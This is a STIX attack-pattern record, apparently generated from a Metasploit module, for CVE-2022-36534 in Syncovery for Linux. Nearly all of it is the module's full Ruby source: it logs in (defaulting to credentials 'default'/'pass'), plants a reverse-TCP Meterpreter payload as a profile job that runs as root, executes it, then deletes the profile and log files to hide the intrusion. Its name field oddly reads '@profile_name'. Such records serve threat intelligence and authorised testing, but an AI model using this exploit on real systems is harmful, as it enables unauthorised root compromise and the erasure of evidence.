{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7e909ba8-2477-4c60-b211-374e4ba8b989",
    "created": "2024-08-14T17:14:53.853327Z",
    "modified": "2024-08-14T17:14:53.853331Z",
    "name": "@profile_name",
    "description": " This module exploits an authenticated command injection vulnerability in the Web GUI of Syncovery File Sync & Backup Software for Linux. Successful exploitation results in remote code execution under the context of the root user.  Syncovery allows an authenticated user to create jobs, which are executed before/after a profile is run. Jobs can contain arbitrary system commands and will be executed as root. A valid username and password or a session token is needed to exploit the vulnerability. The profile and its log file will be deleted afterwards to disguise the attack.  The vulnerability is known to work on Linux platforms. All Syncovery versions prior to v9.48j are vulnerable including all versions of branch 8. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/syncovery_linux_rce_2022_36534.rb",
            "external_id": "syncovery_linux_rce_2022_36534.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-36534"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Syncovery For Linux Web-GUI Authenticated Remote Command Execution',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerability in the Web GUI of Syncovery File Sync & Backup Software for Linux.\n          Successful exploitation results in remote code execution under the context of the root user.\n\n          Syncovery allows an authenticated user to create jobs, which are executed before/after a profile is run.\n          Jobs can contain arbitrary system commands and will be executed as root.\n          A valid username and password or a session token is needed to exploit the vulnerability.\n          The profile and its log file will be deleted afterwards to disguise the attack.\n\n          The vulnerability is known to work on Linux platforms. All Syncovery versions prior to v9.48j are vulnerable including all versions of branch 8.\n        },\n        'Author' => [ 'Jan Rude' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/'],\n          ['CVE', '2022-36534']\n        ],\n        'Platform' => 'unix',\n        'Arch' => [ ARCH_CMD ],\n        'Targets' => [\n          ['Syncovery for Linux < 9.48j', {}]\n        ],\n        'Privileged' => true,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        },\n        'DisclosureDate' => '2022-09-06',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'Payload' => 'cmd/unix/python/meterpreter/reverse_tcp'\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943\n        OptString.new('USERNAME', [true, 'The username to Syncovery (default: default)', 'default']),\n        OptString.new('PASSWORD', [true, 'The password to Syncovery (default: pass)', 'pass']),\n        OptString.new('TOKEN', [false, 'A valid session token', '']),\n        OptString.new('TARGETURI', [true, 'The path to Syncovery', '/']),\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/get_global_variables'),\n      'method' => 'GET'\n    )\n\n    if res && res.code == 200\n      json_res = res.get_json_document\n      if json_res['isSyncoveryWindows'] == 'false'\n        version = json_res['SyncoveryTitle']&.scan(/Syncovery\\s([A-Za-z0-9.]+)/)&.flatten&.first || ''\n        if version.empty?\n          vprint_warning(\"#{peer} - Could not identify version\")\n          Exploit::CheckCode::Detected\n        elsif Rex::Version.new(version) < Rex::Version.new('9.48j') || Rex::Version.new(version) == Rex::Version.new('9.48')\n          vprint_good(\"#{peer} - Syncovery #{version}\")\n          Exploit::CheckCode::Appears\n        else\n          vprint_status(\"#{peer} - Syncovery #{version}\")\n          Exploit::CheckCode::Safe\n        end\n      else\n        Exploit::CheckCode::Safe\n      end\n    else\n      Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    @token = datastore['TOKEN']\n    if @token.blank?\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, '/post_applogin.php'),\n        'vars_get' => {\n          'login' => datastore['USERNAME'].to_s,\n          'password' => datastore['PASSWORD'].to_s\n        },\n        'method' => 'GET'\n      })\n\n      unless res\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to authentication request\")\n      end\n\n      # After login, the application should give us a new token\n      # session_token is actually just base64(MM/dd/yyyy HH:mm:ss) at the time of the login\n      json_res = res.get_json_document\n      @token = json_res['session_token']\n      if @token.present?\n        vprint_good(\"#{peer} - Login successful\")\n      else\n        fail_with(Failure::NoAccess, \"#{peer} - Invalid credentials!\")\n      end\n    end\n\n    # send payload\n    @profile_name = Rex::Text.rand_text_alpha_lower(20)\n    json_body = {\n      'ProfileName' => @profile_name,\n      'Action' => 'Insert',\n      'FormName' => 'synapp_profile_editor_form',\n      'token' => @token,\n      'Name' => @profile_name,\n      'LeftPath' => '/dev/null',\n      'LeftPathDisplay' => '/dev/null',\n      'RightPath' => '/dev/null',\n      'RightPathDisplay' => '/dev/null',\n      'Job_ExecuteBefore' => payload.encoded\n    }\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/post_profilesettings.php'),\n      'headers' => {\n        'X-Requested-With' => 'XMLHttpRequest',\n        'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8'\n      },\n      'data' => JSON.generate(json_body)\n    })\n\n    if res && res.code == 200\n      if res.body.to_s.include? 'Session Expired'\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid token (Session Expired)\")\n      elsif res.body.to_s.include? 'Inserted'\n        vprint_good(\"#{peer} - Profile created\")\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Error (#{res.body})\")\n      end\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Error (response code: #{res.code})\")\n    end\n\n    vprint_status(\"#{peer} - Running profile\")\n    json_body = {\n      'ProfileName' => @profile_name,\n      'token' => @token,\n      'attended' => true\n    }\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/post_runprofile.php'),\n      'data' => JSON.generate(json_body)\n    })\n\n    if res && res.code == 200\n      print_good(\"#{peer} - Exploit successfully executed\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not run profile (response code: #{res.code})\")\n    end\n  end\n\n  def on_new_session(session)\n    # Delete profile to disguise attack in Web GUI\n    vprint_status(\"#{peer} - Trying to delete IOCs\")\n    json_body = {\n      'ProfileName' => @profile_name,\n      'token' => @token\n    }\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/post_deleteprofile.php'),\n      'data' => JSON.generate(json_body)\n    })\n\n    if res && res.code == 200 && (res.body.to_s.include? 'Deleted')\n      vprint_good(\"#{peer} - Profile successfully deleted\")\n    else\n      print_error(\"#{peer} - Could not delete profile (#{res.body})\")\n    end\n\n    # Remove IOC by deleting log files\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/getprogram_settings.php'),\n      'vars_get' => {\n        'token' => @token\n      }\n    )\n\n    if res && res.code == 200\n      json_res = res.get_json_document\n      if json_res['LogPath'].present?\n        log_path = json_res['LogPath']\n      end\n    end\n\n    # Request log files\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/logfiles.json'),\n      'vars_get' => {\n        'pagenum' => 0,\n        'pagesize' => 1\n      },\n      'headers' => {\n        'token' => @token\n      }\n    })\n\n    if res && res.code == 200\n      log_file = res.body.scan(/#{@profile_name}.*?\\.log/)&.flatten&.first || ''\n      register_file_for_cleanup(\"#{log_path}/#{log_file}\")\n    else\n      register_dirs_for_cleanup(log_path.to_s)\n    end\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-09-06",
    "x_mitre_platforms": [
        "unix'"
    ]
}